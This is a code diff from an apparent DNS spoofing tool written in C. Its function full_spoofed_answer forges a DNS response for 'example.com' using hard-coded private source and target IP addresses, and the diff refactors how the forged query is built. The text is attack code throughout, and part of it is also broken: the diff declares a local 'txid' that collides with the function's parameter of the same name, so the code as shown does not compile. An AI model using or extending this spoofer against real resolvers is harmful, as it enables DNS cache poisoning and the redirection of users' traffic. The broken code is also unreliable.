@@ -21,6 +21,11 @@
 #define PACKET_SIZE 1024
 #define DNS_PORT 53
 
+
+int build_dns_query(unsigned char *buffer, const char *hostname, uint32_t tid);
+
+int build_dns_response(unsigned char *buffer, unsigned char *query, int query_len, uint32_t txid);
+
 // DNS Header Structure
 struct dns_header {
     unsigned short id;       // Transaction ID
@@ -68,21 +73,18 @@ unsigned short checksum(void *b, int len) {
 
 int full_spoofed_answer(uint txid, uint d_port) {
     unsigned char buffer[PACKET_SIZE];
+    unsigned char query[PACKET_SIZE];
     memset(buffer, 0, PACKET_SIZE);
 
-    // Example DNS query (a simple query for 'example.com')
-    unsigned char query[] = {
-        0x12, 0x34,  // Transaction ID
-        0x01, 0x00,  // Standard query (flags)
-        0x00, 0x01,  // One question
-        0x00, 0x00,  // No answers
-        0x00, 0x00,  // No authority
-        0x00, 0x00,  // No additional sections
-        0x07, 'e', 'x', 'a', 'm', 'p', 'l', 'e', 0x03, 'c', 'o', 'm', 0x00,  // Domain name
-        0x00, 0x01, 0x00, 0x01  // Type A, Class IN
-    };
+    // Parameters
+    const char *hostname = "example.com";
+    uint32_t txid = 0x1234;  // Transaction ID
+    const char *source_ip = "192.168.1.207";
+    const char *dest_ip = "192.168.1.203";
+    int dest_port = 53;
 
-    int query_len = sizeof(query);
+    // Build DNS query
+    int query_len = build_dns_query(query, hostname, txid);
 
     // Build the DNS response
     int response_len = build_dns_response(buffer, query, query_len, txid);
@@ -137,8 +139,6 @@ int full_spoofed_answer(uint txid, uint d_port) {
     return 0;
 }
 
-
-int build_dns_query(unsigned char *buffer, const char *hostname, uint32_t tid);
 
 // Structure for DNS header and response construction
 int build_dns_response(unsigned char *buffer, unsigned char *query, int query_len, uint32_t txid) {
